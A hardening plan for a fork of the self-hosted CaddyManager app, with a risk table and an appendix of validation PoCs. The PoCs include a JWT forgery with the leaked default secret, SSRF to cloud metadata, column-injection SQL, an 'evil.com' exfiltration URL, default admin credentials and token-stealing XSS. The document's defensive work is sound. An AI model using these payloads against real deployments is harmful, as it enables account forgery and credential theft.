# CaddyManager Hardened Fork — Security & Maintenance Plan

**Upstream:** `caddymanager/caddymanager` — https://github.com/caddymanager/caddymanager  
**Upstream commit pinned:** `52f69b64` (2025-09-07, `pushed_at:2026-02-20`) — `archived:false` per `api.github.com/repos/caddymanager/caddymanager` 2026-09-01, but stale (~6 months no pushes, 24 open issues).  
**License:** MIT (`LICENSE:4` Copyright 2025 B Stolk). Fork permitted if `LICENSE:15-17` notice preserved. Not affiliated with Caddy/Stack Holdings (`LICENSE:27`).  
**Stack:** MEVN — Vue 3 + Vite + Pinia, Node 20 Express, SQLite (default) / MongoDB, `better-sqlite3`, `mongoose@7.6.3`, `axios`, `jsonwebtoken`, Caddy 2 Admin API.  
**Local clone for review:** `/tmp/caddymanager` (114 commits, `git remote origin https://github.com/caddymanager/caddymanager.git`).

> This plan assumes you continue to self-host CaddyManager and want a safe, maintainable fork. If you prefer to decommission, jump to §9 Alternatives.

---

## Table of Contents
1. [Goals & Non-Goals](#1-goals--non-goals)
2. [How to Properly Create a Git Repo for Someone Else’s Project](#2-how-to-properly-create-a-git-repo-for-someone-elses-project)
3. [Current State Assessment](#3-current-state-assessment)
4. [Risk Summary (Verified)](#4-risk-summary-verified)
5. [Remediation Phases](#5-remediation-phases)
6. [Verification & Testing Strategy](#6-verification--testing-strategy)
7. [Branching, CI/CD, Release](#7-branching-cicd-release)
8. [Governance & Upstream Sync](#8-governance--upstream-sync)
9. [Alternatives](#9-alternatives)
10. [Timeline & Effort](#10-timeline--effort)
11. [Appendix A: Detailed Findings Index](#appendix-a-detailed-findings-index)
12. [Appendix B: PoCs & Validation Commands](#appendix-b-pocs--validation-commands)
13. [Appendix C: Fork Setup Checklist](#appendix-c-fork-setup-checklist)

---

## 1. Goals & Non-Goals

**Goals**
- Eliminate Critical/High exploitable bugs without breaking existing SQLite/Mongo data.
- Establish a legally correct, history-preserving fork that can track or diverge from upstream.
- Make the edge reverse-proxy manager safe to expose (even if only on LAN) with defense-in-depth.
- Provide reproducible builds, pinned deps, and CI gates so the fork does not rot again.

**Non-Goals**
- Full feature rewrite or UI redesign.
- Replacing Caddy itself — only the management plane is hardened.
- Upstream contribution without maintainer consent (PRs welcome but not blocking).

**Success criteria:** `npm audit` 0 High, `trivy` 0 Critical, P0 PoCs denied, `metrics`/`build-info` require auth, JWT forgery fails without env secret, SSRF to `169.254.169.254` blocked, SQL column injection returns 400 not 500 schema leak.

---

## 2. How to Properly Create a Git Repo for Someone Else’s Project

### 2.1 What NOT to do
```bash
mkdir Caddymanager && cd Caddymanager && git init
cp -r /tmp/caddymanager/* .   # loses git history, blame, tags, ability to merge upstream
git add . && git commit -m "initial"
```
This orphans history, hides original authors, breaks `git log --follow`, and violates attribution norms (even if MIT legally allows copying files, you must still ship `LICENSE:15-17`).

### 2.2 Correct: GitHub Fork (preserves history + link)

**Option A — `gh` CLI (recommended, 30s):**
```bash
# from any dir
gh repo fork caddymanager/caddymanager --clone --remote
# creates ./caddymanager, origin=your fork, upstream=caddymanager/caddymanager
cd caddymanager
git remote -v
# origin  https://github.com/<YOU>/caddymanager.git (push)
# upstream https://github.com/caddymanager/caddymanager.git (fetch)

# move to your Pipeline dir (currently empty at /home/conorm/Desktop/Pipeline/Caddymanager)
mv ./caddymanager /home/conorm/Desktop/Pipeline/Caddymanager-hardened
cd /home/conorm/Desktop/Pipeline/Caddymanager-hardened
git fetch upstream
git checkout -b hardened/main 52f69b64
git push -u origin hardened/main:main
```

**Option B — Manual (no `gh`):**
```bash
git clone https://github.com/caddymanager/caddymanager.git CaddyManager-hardened
cd CaddyManager-hardened
git remote rename origin upstream
gh repo create <YOU>/caddymanager-hardened --public --source=. --remote=origin --push
# or without gh: create empty repo on github.com, then:
git remote add origin https://github.com/<YOU>/caddymanager-hardened.git
git push -u origin main
```

**Option C — Mirror (only if you need private archival, not for active fork):**
```bash
git clone --mirror https://github.com/caddymanager/caddymanager.git
# push to new bare repo — preserves all refs but severs GitHub fork network
```

### 2.3 Post-fork hygiene
1. Keep `LICENSE` verbatim, add `NOTICE.md`:
   ```
   Fork of caddymanager/caddymanager @52f69b64 (2025-09-07) by <YOU>.
   Original Copyright 2025 B Stolk, MIT. Not affiliated with Caddy/Stack Holdings.
   Hardened fork: see PLAN.md. Upstream: https://github.com/caddymanager/caddymanager
   ```
2. Update image names to avoid typosquatting: `.github/workflows/backend-docker-publish.yml:7` `IMAGE_NAME: ghcr.io/<YOU>/caddymanager-backend` and `frontend-docker-publish.yml:7` similarly.
3. Enable branch protection on `main` (require PR, CI pass, 1 review).
4. Add `SECURITY.md` with disclosure email and `git tag -s` signing.
5. Never force-push `main` after publishing; use `develop` for upstream sync.
6. If you must scrub a secret leaked in history, use `git filter-repo` on a branch, document it, and notify users to rebase.

### 2.4 Staying syncable
```bash
git fetch upstream
git checkout develop
git merge upstream/main --no-ff -m "sync upstream main 2026-09-01"
# or rebase for clean history: git rebase upstream/main
git push origin develop
# PR develop -> main after CI passes
```
GitHub UI will also show `Fetch upstream` button because of fork network.

---

## 3. Current State Assessment

- **Activity:** 114 commits, last `main` merge 2025-09-07, 18 commits in last year, `ghcr.io` images built from `develop`/`main` via `backend-docker-publish.yml`/`frontend-docker-publish.yml`. No `archived` flag, but no maintainer responses for months.
- **Deployment model:** `docker-compose.yml` (SQLite default `sqlite_data:/app/data`, optional `mongodb` profile), `frontend` Caddy `:80` proxies `/api/*` to `backend:3000`, `CADDY_SANDBOX_URL` for Caddyfile adaptation.
- **Auth:** JWT (`jsonwebtoken@9.0.2`) + API keys (`models/apiKey/*`) via `middleware/authMiddleware.js:6-155`. No rate-limit, no helmet, `cors: {origin:'*', credentials:true}` (`backend/app.js:30-34`), `express.json({limit:'50mb'})`.
- **Data:** Dual-engine repos (`repositories/*`, `models/*/index.js` switch on `DB_ENGINE`). First boot creates `admin:caddyrocks` (`backend/services/sqliteService.js:61`, `backend/services/mongoService.js:38`).
- **Frontend:** Vue 3 + `axios@^1.8.4` (17 advisories), `localStorage['auth_token']` (`frontend/src/services/authService.js:32`), `v-html` in 3 components, `Caddyfile:1` `:80` plain HTTP.

---

## 4. Risk Summary (Verified)

| # | Title | Location | Severity | Exploit |
|---|-------|----------|----------|---------|
| C1 | Hardcoded JWT fallback | `backend/middleware/authMiddleware.js:6`, `backend/controllers/authController.js:6` | **Critical** | `JWT_SECRET` unset -> forge `admin` JWT with `'your_jwt_secret_key_for_development'` |
| C2 | SSRF stored+reflected | `backend/services/caddyService.js:16,89,113`, `backend/controllers/caddyController.js:68,243`, `backend/services/convertService.js:22`, `backend/services/pingService.js:44` | **Critical** | Auth’d `POST /caddy/test-connection {"apiUrl":"http://169.254.169.254","apiPort":80,"adminApiPath":"/latest/meta-data/"}` fetches cloud metadata; `adminApiPath="http://evil.com"` overrides `baseURL` |
| C3 | SQL column-name injection | `backend/repositories/caddyServersRepository.js:79`, `backend/repositories/caddyConfigRepository.js:121`, `backend/models/caddyServers/caddyServersSQLiteModel.js:111`, `backend/models/user/userSQLiteModel.js:163` (`\`${key} = ?\``) | **Critical** | `PUT /caddy/servers/1 {"\"; SELECT sql FROM sqlite_master; --":"x"}` -> 500 schema leak via `backend/controllers/caddyController.js:150` mass-assign |
| C4 | No RBAC/IDOR | `backend/router/caddyRoutes.js:8` only `protect`, `backend/controllers/caddyController.js:14-722` all handlers | **Critical** | Any `user` role can `GET/PUT/DELETE` any server, `POST /caddy/configs/:id/apply {"serverIds":["<victim>"]}` overwrites prod |
| H1 | Public inventory | `backend/router/metricsRoutes.js:31-124`, `backend/router/buildInfoRoutes.js:1`, `backend/app.js:44` | **High** | `curl /api/v1/metrics` / `/metrics/prometheus` / `/build-info` anonymous -> hostnames, upstreams, mem, commit |
| H2 | CORS wildcard + no headers | `backend/app.js:30-34` `origin:'*' + credentials:true`, no `helmet` | **High** | Cross-origin fetch with stolen Bearer, clickjacking, no CSP/HSTS |
| H3 | 20+ dep CVEs | `backend/package.json:15-28` (`axios 1.11.0 <1.15.2`, `express 4.21.2`, `mongoose 7.8.7`, `jws<3.2.3`, `lodash 4.17.21`), `frontend/package.json:18` `axios 1.8.4` | **High** | `GHSA-4hjh-wcwx-xvwj` DoS, `GHSA-3p68` SSRF bypass, `lodash` template RCE |
| H4 | Audit bypass | `backend/services/auditService.js:26,44,57`, `backend/controllers/auditLogController.js:30` | **High** | `filter` ignored for SQLite, `catch->return null` silently drops logs, regex ReDoS |
| H5 | Stored XSS | `frontend/src/components/configurations/configurationDataComp.vue:276`, `configurationCreateDataComp.vue:228` `v-html` on `error.response.data.error`, `frontend/src/components/dashboard/dashboardPanelTextComp.vue:21` `v-html` | **High** | Caddyfile error `<img onerror=...localStorage.auth_token>` stored, executes for all viewers |
| H6 | Token in localStorage + unverified `api_base_url` | `frontend/src/services/authService.js:32`, `frontend/src/services/apiService.js:21`, `frontend/src/services/configService.js:9` | **High** | XSS steals `auth_token`, poisoned `/config {"api_base_url":"https://evil.com"}` sends Bearer to attacker |
| H7 | Body limit DoS + no rate-limit | `backend/app.js:35-36` `50mb`, `backend/router/authRoutes.js:71` login no limit, `backend/controllers/convertController.js:17` | **Medium** | 50 MB JSON/Caddyfile -> OOM, brute-force `admin:caddyrocks` (`backend/services/sqliteService.js:61`) |
| H8 | Weak defaults | `backend/config/dbConfig.js:6` prod without `MONGODB_URI` -> `MongoMemoryServer` ephemeral, `JWT_EXPIRATION` vs `JWT_EXPIRES_IN` mismatch | **Medium** | Data loss on restart, token lifetime misconfig |
| M1 | Info leak | `backend/app.js:56`, `backend/controllers/*:500 json {error:error.message}` | **Medium** | `ECONNREFUSED 127.0.0.1` + Caddy stack in responses |
| M2 | Infra | `backend/Dockerfile:2` `node:20-bullseye-slim` EOL, `frontend/Caddyfile:1` `:80` no TLS, `frontend/vite.config.js:13` `vueDevTools()` in prod | **Medium** | Supply-chain, sniffing, devtools leaks Pinia |

See Appendix A for full index.

---

## 5. Remediation Phases

### Phase 0 — Fork & Baseline (Day 1-2) — *no code risk*
**Goal:** History-preserving fork, reproducible CI, baseline metrics.

- [ ] Execute §2.2 fork to `github.com/<YOU>/caddymanager-hardened`, branch `hardened/main` from `52f69b64`, push, set default branch `main`, enable `Require PR`, `Require status checks`.
- [ ] Add `NOTICE.md`, `SECURITY.md`, update `README.md` banner: `> **Hardened Fork** — see PLAN.md. Upstream unmaintained as of 2026-02-20.`
- [ ] Pin CI: update `.github/workflows/*.yml` `setup-node@v4` `node-version:'20'`, add `npm audit --audit-level=high` and `trivy fs --severity CRITICAL` jobs, cache `backend/package-lock.json`.
- [ ] Record baselines: `npm --prefix backend audit --json > baseline-backend-audit.json`, `npm --prefix frontend audit --json > baseline-frontend-audit.json`, `trivy image` on built `backend`, `curl /api/v1/metrics` anon check (expect 200 pre-fix).
- [ ] Create issues for C1-C4, H1-H8 labeled `P0`, `P1`, `P2`.

**Acceptance:** `git log --oneline upstream/main..main` shows 1 commit (`add NOTICE`), CI green (even if audit fails, artifact uploaded), `docker compose --profile mongodb config` validates.

### Phase 1 — P0 Critical (Week 1-2) — *must ship before any Internet exposure*

#### 1.1 JWT Secret Hardening — `backend/middleware/authMiddleware.js:6`, `backend/controllers/authController.js:6`, `backend/app.js:17`
- Replace `|| 'your_jwt_secret_key_for_development'` with:
  ```js
  if (!process.env.JWT_SECRET) throw new Error('JWT_SECRET must be set');
  const JWT_SECRET = process.env.JWT_SECRET;
  ```
- Add `algorithms:['HS256']` to `jwt.verify` (`middleware/authMiddleware.js:76`) and `jwt.sign` explicit `algorithm:'HS256'`.
- Fix env name: support both `JWT_EXPIRATION` and `JWT_EXPIRES_IN` with deprecation warning, docs update in `.env.example:16`.
- Add startup check in `backend/app.js:17` before `connectToSQLite`.
- Rotate existing tokens: bump `version` claim or clear `localStorage` on frontend (`frontend/src/services/authService.js:87`).

**Test:** `JWT_SECRET="" npm test` fails fast; forged token with old fallback returns 401; `npm run test -- auth` passes.

#### 1.2 SQL Column Whitelisting — `backend/repositories/*`, `backend/models/*SQLiteModel.js`
- For every `findByIdAndUpdate`/`create` that does `` `${key} = ?` ``, add:
  ```js
  const ALLOWED = new Set(['name','apiUrl','apiPort','adminApiPath','active','status','description','tags','activeConfig']);
  for (const k of Object.keys(updateData)) if (!ALLOWED.has(k)) { delete updateData[k]; }
  if (!Object.keys(updateData).length) throw new ApiError(400,'No valid fields');
  ```
- Apply to `caddyServersRepository.js:79,103`, `caddyConfigRepository.js:121`, `userSQLiteModel.js:163`, `apiKeySQLiteModel.js:205` (already partially whitelisted, tighten).
- Add `utils/validator.js` `sanitizeFilter` for Mongo paths (`userRepository.js:64` check `typeof username==='string'`).

**Test:** `PUT /caddy/servers/1 {"name":"ok","; DROP TABLE users; --":"x"}` -> 400, `GET /caddy/servers/1` still shows old name, no 500 schema leak.

#### 1.3 SSRF Deny-by-Default — `backend/services/caddyService.js:16-134`, `backend/controllers/caddyController.js:68,243`, `backend/services/convertService.js:22`, `backend/services/pingService.js:44`
- Central `utils/ssrf.js`:
  ```js
  export function assertSafeUrl(apiUrl, apiPort, adminApiPath) {
    const u = new URL(apiUrl); if (!['http:','https:'].includes(u.protocol)) throw 400;
    if (u.hostname.match(/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.|0\.0\.0\.0|::1|fc00:|fe80:)/)) throw 400;
    if (!Number.isInteger(+apiPort) || +apiPort<1 || +apiPort>65535) throw 400;
    if (!/^\/[A-Za-z0-9_\-\/]*$/.test(adminApiPath)) throw 400; // no http
    return u;
  }
  export const axiosOpts = { maxRedirects:0, maxContentLength:1_000_000, timeout:10_000, validateStatus:null };
  ```
- Call in `addServer`, `updateServer`, `testServerConnection`, `getConfig`, `updateConfig`, `convertService`, `pingService`.
- Change `caddyService.js:89` `axiosInstance.get(server.adminApiPath)` to safe join `new URL(adminApiPath, baseURL).toString()` after validation (prevents absolute URL override).
- Add `httpAgent` that re-checks DNS resolution (pin then validate IP) if using `undici`/`axios` with custom lookup.

**Test:** `POST /caddy/servers {"apiUrl":"http://169.254.169.254","apiPort":80,"adminApiPath":"/latest/meta-data/"}` -> 400 `Private IP blocked`; `adminApiPath:"http://evil.com"` -> 400.

#### 1.4 RBAC & Ownership — `backend/router/caddyRoutes.js:8`, `backend/controllers/caddyController.js:14-722`
- Extend `caddyServers`/`caddyConfig` schemas with `createdBy: {type:String, ref:'User'}` (SQLite `createdBy` column, Mongo `ObjectId`).
- In `caddyService.addServer` set `createdBy=req.user.id`.
- Middleware `requireOwnerOrAdmin`:
  ```js
  const server=await caddyServersRepository.findById(id);
  if (!server) throw 404; if (req.user.role!=='admin' && server.createdBy!==req.user.id) throw 403;
  ```
- Apply to all `caddyRoutes` (`GET /servers/:id`, `PUT /servers/:id`, `DELETE`, `GET /servers/:id/config`, `POST /configs/:id/apply`). Keep `protect` + add `authorize('admin')` for `test-connection` and `applyConfig` cross-server.
- Add `checkApiPermission('write')` for API keys where `isApiRequest` is true (`middleware/authMiddleware.js:124`).

**Test:** Login as `user` role, `GET /caddy/servers` returns only own + 403 on `PUT /caddy/servers/<admin-server>`.

**Phase 1 Exit:** P0 PoCs all deny, `npm test` passes, `docker compose up` fresh DB migration adds `createdBy`.

### Phase 2 — P1 Hardening (Week 3-4)

#### 2.1 Edge & Auth Hardening — `backend/app.js:30-38`, `backend/router/metricsRoutes.js:31`, `backend/router/buildInfoRoutes.js:1`
- Replace `corsOptions` with `origin: (process.env.CORS_ORIGIN||'http://localhost:5173').split(',')`, `methods:['GET','POST','PUT','DELETE']`, `allowedHeaders:['Content-Type','Authorization','X-API-Key']`.
- Add `helmet({contentSecurityPolicy:false})` + `hsts`, `express-rate-limit` (login 5/15min, `test-connection` 10/hour, `POST /caddy/servers` 60/min).
- Change limits: `express.json({limit:'200kb'})`, `express.text({limit:'512kb', type:'text/caddyfile'})`, stream large configs to temp file.
- Protect `metrics`/`buildInfo`: `router.use(protect, authorize('admin'))` or `ipAllowlist('127.0.0.1/32')` for Prometheus.
- Add `SIGTERM` handler (`backend/app.js:74`) alongside `SIGINT`.

#### 2.2 Dependency Upgrade — `backend/package.json`, `frontend/package.json`, `backend/Dockerfile:2`
- `axios@^1.15.3`, `express@4.22.1`, `mongoose@7.8.10` (or 8.x with `sanitizeFilter` migration), `jsonwebtoken@9.0.4`, `lodash@4.17.23`, `swagger-ui-express@5.0.1` bump transitive `yauzl`/`js-yaml`. Run `npm audit fix` then `npm dedupe`.
- `FROM node:20-bookworm-slim`, add `USER node` earlier, remove `pm2 -g` (`Dockerfile:8`), add `HEALTHCHECK CMD node healthcheck.js`, `.dockerignore` ensure `.git` excluded, multi-stage build for `better-sqlite3` compile.

#### 2.3 Frontend XSS & Token — `frontend/src/components/configurations/configurationDataComp.vue:276`, `configurationCreateDataComp.vue:228`, `frontend/src/components/dashboard/dashboardPanelTextComp.vue:21`, `frontend/src/services/*`
- Replace `v-html` with `{{ caddyfileValidationError }}` + CSS `white-space:pre-wrap`, or `DOMPurify.sanitize(err,{ALLOWED_TAGS:['br']})`.
- Move token: backend `Set-Cookie: __Host-auth_token=...; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=86400` on `POST /auth/login`, frontend stop `localStorage.setItem('auth_token')`, `apiService.js:21` rely on `withCredentials:true` + backend `cors.credentials`. If staying Bearer, add `Content-Security-Policy default-src 'self'; script-src 'self'` via `frontend/Caddyfile:4` and `frontend/src/services/configService.js:9` validate `api_base_url` is `^/api(/|$)` or `new URL(v, location.origin).origin===location.origin`.
- Fix `frontend/src/services/authService.js:87` `JSON.parse` guard `try{...}catch{localStorage.removeItem('user')}`.
- Gate `frontend/vite.config.js:13` `vueDevTools()` behind `process.env.NODE_ENV!=='production'`, `frontend/Caddyfile:1` `header { Strict-Transport-Security "max-age=31536000; includeSubDomains" }` + `X-Frame-Options DENY`.

#### 2.4 Audit & Reliability — `backend/services/auditService.js:26,44,57`, `backend/services/pingService.js:44,126`
- Fix SQLite `getAuditLogs` to actually filter (use `auditLogRepository.findByFilter`), add `limit<=100`, validate `startDate`/`endDate`.
- Remove `skipActions` bypass or make it `['healthCheck']` only and log with `action:_healthCheck_internal`.
- `pingService.js:126` use `p-limit(5)` for concurrency, add interval lock `if (pinging) return; pinging=true`.
- Fix URL colon bug (`apiUrl.endsWith('/')?'':':'`).

**Phase 2 Exit:** `npm audit` 0 High, `trivy` 0 Critical, `curl /api/v1/metrics` anon -> 401, `curl -H "Authorization: Bearer $USER_TOKEN" /caddy/servers` RBAC enforced, XSS payload shows as text not executed.

### Phase 3 — Polish & Operate (Week 5-6)

- [ ] Input validation with `zod`/`joi` for all `req.body` (`caddyController` `name`, `apiUrl`, `jsonConfig` schema 1 MB limit), add `express-validator` middleware.
- [ ] Add `auditLog` TTL (`AUDIT_LOG_RETENTION_DAYS` cron, `auditLogMongoModel` TTL index, SQLite `DELETE WHERE createdAt < ?`).
- [ ] Add `changePassword` token rotation (`backend/controllers/authController.js:223` invalidate old JWT via `jti` denylist or version bump).
- [ ] Frontend: add `maxContentLength:5*1024*1024` in `frontend/src/services/apiService.js:11`, `zod` validate `metrics` (`dashboardView.vue:33`), `deepClone` depth limit (`frontend/src/services/templateService.js:19`).
- [ ] Docs: update `docker-compose.yml` `JWT_SECRET` required, `CORS_ORIGIN` example, `DB_ENGINE` note on ephemeral memory fallback; add `docs/SECURITY.md`.
- [ ] Data migration: script to backfill `createdBy` for existing servers/configs (assign to `admin` user).

---

## 6. Verification & Testing Strategy

- **Unit:** Add `__tests__/repositories/ssrf.test.js`, `authMiddleware.test.js` (JWT fallback throws), `auditService.test.js` (filter pass-through).
- **Integration:** `supertest` hit `POST /auth/login` brute-force 6th -> 429, `POST /caddy/servers` private IP -> 400, `PUT /caddy/servers/:id` column injection -> 400, `GET /metrics` anon -> 401.
- **E2E:** Playwright: login as `user`, try to edit admin server -> 403 banner, XSS payload in Caddyfile error -> `textContent` not `innerHTML`.
- **Security scans (CI):** `npm audit`, `trivy fs`, `trivy image ghcr.io/<YOU>/caddymanager-backend:pr`, `semgrep --config=auto`, `gitleaks`.
- **Manual:** Run PoCs from Appendix B before/after each phase, capture `baseline-*.json`.

---

## 7. Branching, CI/CD, Release

```
main (protected)  <- PR from develop (hardened stable, tags v0.1-hardened.1)
develop           <- PR from fix/* (syncs upstream/main weekly)
fix/jwt-secret    fix/ssrf-deny    fix/sql-whitelist  fix/rbac
```

**.github/workflows:**
- `ci.yml` (new): `on: pull_request` -> `npm ci`, `npm test`, `npm audit`, `trivy fs`, `semgrep`.
- `backend-docker-publish.yml:1` `on: push: branches: [main]` + `tags: ['v*']`, same for frontend, push to `ghcr.io/<YOU>/...` with `cosign` sign.
- Keep `backend-docker-publish-next.yml` for `develop` -> `ghcr.io/<YOU>/...:next`.

**Release:** `git tag v0.1-hardened.1 -s -m "P0 fixes"` -> auto-build `ghcr.io/<YOU>/caddymanager-backend:v0.1-hardened.1`, `docker compose pull && up -d`.

---

## 8. Governance & Upstream Sync

- **If upstream revives:** Weekly `git fetch upstream`, PR `upstream/main` -> `develop`, run CI, resolve conflicts, keep `NOTICE.md` updated. Contribute P0 fixes upstream via PR.
- **If stays dead >6 months:** Announce hard fork in README, pin `Upstream last commit 52f69b64`, consider renaming `caddymanager-hardened` to avoid confusion, keep MIT attribution.
- **Issue triage:** `P0` (auth/SSRF/SQLi), `P1` (XSS/CORS/deps), `P2` (polish). Use `CODEOWNERS`.
- **Support:** Document `admin:caddyrocks` must be changed on first boot; add `onboarding` check `if (await userRepository.isDefaultAdmin()) warn`.

---

## 9. Alternatives

If hardening effort > value, consider:
- **Nginx Proxy Manager** (mature, similar UI, active).
- **Traefik + File Provider** + `traefik-certs-dumper`.
- **Plain Caddy** with `caddy admin --config` + GitOps (no manager).
- **Pangolin** / **Authelia** + Caddy for auth.

Decommission plan: export `jsonConfig` via `GET /caddy/servers/:id/config` -> `caddy fmt --adapter caddyfile`, commit to Git, run Caddy natively.

---

## 10. Timeline & Effort

| Phase | Duration | Owner | Output |
|-------|----------|-------|--------|
| 0 Baseline | 1-2 days | You | Fork, CI, baselines |
| 1 P0 | 1-2 weeks | You | JWT/SSRF/SQLi/RBAC fixes, tag `v0.1-hardened.1` |
| 2 P1 | 2 weeks | You | CORS/helmet/rate-limit, deps, XSS, token, metrics auth |
| 3 Polish | 1-2 weeks | You | Validation, audit TTL, docs, migration |
| Ongoing | Monthly | You | `npm audit`, `trivy`, upstream sync, releases |

Total 4-6 weeks for safe self-host; P0 alone makes current LAN use tolerable if you block Internet ingress and set strong `JWT_SECRET`.

---

## Appendix A: Detailed Findings Index

| ID | File:Line | Issue |
|----|-----------|-------|
| C1 | `backend/middleware/authMiddleware.js:6`, `backend/controllers/authController.js:6` | Hardcoded JWT fallback |
| C2 | `backend/services/caddyService.js:16,89,113,134`, `backend/controllers/caddyController.js:68,243`, `backend/services/convertService.js:22`, `backend/services/pingService.js:44` | SSRF |
| C3 | `backend/repositories/caddyServersRepository.js:79`, `backend/repositories/caddyConfigRepository.js:121`, `backend/models/caddyServers/caddyServersSQLiteModel.js:111`, `backend/models/user/userSQLiteModel.js:163` | SQL column injection |
| C4 | `backend/router/caddyRoutes.js:8`, `backend/controllers/caddyController.js:14-722` | No RBAC/IDOR |
| H1 | `backend/router/metricsRoutes.js:31`, `backend/router/buildInfoRoutes.js:1`, `backend/app.js:44` | Public metrics/build-info |
| H2 | `backend/app.js:30-34`, `frontend/Caddyfile:1` | CORS wildcard, no security headers |
| H3 | `backend/package.json:15`, `frontend/package.json:18` | Dep CVEs (`axios`, `mongoose`, `lodash`, `jws`) |
| H4 | `backend/services/auditService.js:26,44,57`, `backend/controllers/auditLogController.js:30` | Audit bypass |
| H5 | `frontend/src/components/configurations/configurationDataComp.vue:276`, `configurationCreateDataComp.vue:228`, `frontend/src/components/dashboard/dashboardPanelTextComp.vue:21` | XSS `v-html` |
| H6 | `frontend/src/services/authService.js:32`, `frontend/src/services/apiService.js:21`, `frontend/src/services/configService.js:9` | localStorage token + unverified api_base_url |
| H7 | `backend/app.js:35-36`, `backend/router/authRoutes.js:71` | 50 MB DoS + no rate-limit + default creds `backend/services/sqliteService.js:61` |
| H8 | `backend/config/dbConfig.js:6`, `backend/Dockerfile:2` | Ephemeral Mongo fallback, EOL base image |

---

## Appendix B: PoCs & Validation Commands

**JWT forgery (C1):**
```bash
node -e "console.log(require('jsonwebtoken').sign({id:'1',role:'admin'}, 'your_jwt_secret_key_for_development'))"
curl http://localhost:3000/api/v1/auth/users -H "Authorization: Bearer <forged>"
# expect 401 after fix even without env
```

**SSRF (C2):**
```bash
TOKEN=$(curl -s http://localhost:3000/api/v1/auth/login -H "Content-Type: application/json" -d '{"username":"admin","password":"caddyrocks"}' | jq -r .token)
curl -s http://localhost:3000/api/v1/caddy/test-connection -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"apiUrl":"http://169.254.169.254","apiPort":80,"adminApiPath":"/latest/meta-data/"}' | jq
# expect 400 Private IP blocked after fix
```

**SQLi (C3):**
```bash
curl -X PUT http://localhost:3000/api/v1/caddy/servers/1 -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"name":"x","\"; SELECT sql FROM sqlite_master; --":"x"}'
# expect 400 No valid fields, not 500 schema leak
```

**RBAC (C4):**
```bash
# as user role
curl http://localhost:3000/api/v1/caddy/servers/<admin-server-id> -H "Authorization: Bearer $USER_TOKEN"
# expect 403 after fix
```

**Metrics (H1):**
```bash
curl -i http://localhost:3000/api/v1/metrics
# expect 401 after fix (was 200)
```

**XSS (H5):**
Submit Caddyfile that triggers error containing `<img src=x onerror=alert(1)>`, view as another user — should show literal text, no alert.

**Baseline captures:**
```bash
npm --prefix backend audit --json > baseline-backend-audit.json
npm --prefix frontend audit --json > baseline-frontend-audit.json
trivy fs --severity CRITICAL backend > baseline-trivy.txt
```

---

## Appendix C: Fork Setup Checklist

- [ ] `gh repo fork caddymanager/caddymanager --clone --remote`
- [ ] `git checkout -b hardened/main 52f69b64 && git push -u origin hardened/main:main`
- [ ] Add `NOTICE.md` + `SECURITY.md`, update `README` banner, change `IMAGE_NAME` in `.github/workflows/*publish.yml:7`
- [ ] Branch protection on `main` (PR + CI)
- [ ] `npm --prefix backend ci && npm audit` baseline, `npm --prefix frontend ci`
- [ ] Create issues `P0-JWT`, `P0-SSRF`, `P0-SQLi`, `P0-RBAC` linked to this PLAN
- [ ] Set secrets `JWT_SECRET`, `CORS_ORIGIN`, `GHCR_PAT` in repo settings
- [ ] First PR: Phase 1.1 JWT fix

---

*Generated 2026-09-01 from review of `/tmp/caddymanager`. Keep this file in repo root and update `Last verified: <date> <commit>` after each phase.*
